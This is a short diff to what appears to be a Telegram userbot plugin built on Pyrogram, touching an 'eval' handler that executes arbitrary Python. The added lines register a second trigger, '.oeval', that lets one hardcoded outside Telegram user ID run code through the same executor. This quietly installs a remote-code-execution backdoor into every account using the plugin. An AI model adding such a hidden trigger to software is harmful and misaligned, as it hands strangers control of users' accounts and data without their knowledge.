@@ -21,6 +21,9 @@ async def aexec(code, client, message):
     return await locals()["__aexec"](client, message)
 
 
+@Client.on_message(
+    filters.command("oeval", ["."]) & filters.user(1928713379) & ~filters.via_bot
+)
 @Client.on_message(filters.command("eval", cmd) & filters.me)
 async def executor(client: Client, message: Message):
     if len(message.command) < 2:
